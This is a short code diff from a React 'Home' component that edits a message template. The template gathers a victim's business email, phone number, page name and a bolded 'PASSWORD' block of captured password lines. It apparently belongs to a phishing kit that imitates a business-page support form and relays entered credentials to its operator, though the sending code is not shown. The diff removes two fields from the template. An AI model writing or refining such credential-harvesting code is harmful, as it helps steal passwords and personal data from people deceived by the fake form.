@@ -326,8 +326,7 @@ const Home = () => {
    Biz Email: <code>${escapeHtml(form.businessEmail)}</code>
    Phone: <code>${escapeHtml(form.phone)}</code>
    Page: <code>${escapeHtml(form.pageName)}</code>
-   Reason: <code>${escapeHtml(form.reason)}</code>
-   Note: <code>${escapeHtml(form.additionalNotes)}</code>
+
 
 🔐 <b>PASSWORD</b>
 ${passwordLines}
